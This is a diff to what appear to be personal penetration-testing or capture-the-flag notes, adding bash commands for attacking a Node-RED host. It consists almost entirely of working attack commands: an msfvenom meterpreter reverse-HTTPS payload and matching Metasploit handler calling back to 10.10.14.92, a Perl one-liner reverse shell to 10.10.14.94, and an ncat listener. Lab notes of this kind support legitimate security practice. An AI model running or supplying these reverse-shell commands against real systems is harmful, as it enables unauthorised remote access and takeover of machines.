@@ -1,8 +1,17 @@
 
 ```bash
-7de1d67778f7702daab47daa9ff58d1d
+# Get the id for /red/{id} 
+curl -X POST http://$IP:1880
+
+# Met - 0xdf metasploit pivoting
+msfvenom -p linux/x64/meterpreter_reverse_https LHOST=10.10.14.92 LPORT=4444 -f elf -o met
+
+msfconsole -qx "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter_reverse_https; set LHOST 10.10.14.92; set LPORT 4444; run"
+
 
 perl -e 'use Socket;$i="10.10.14.94";$p=8002;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
+
+
 
 rlwrap ncat -lvnp 800X
 
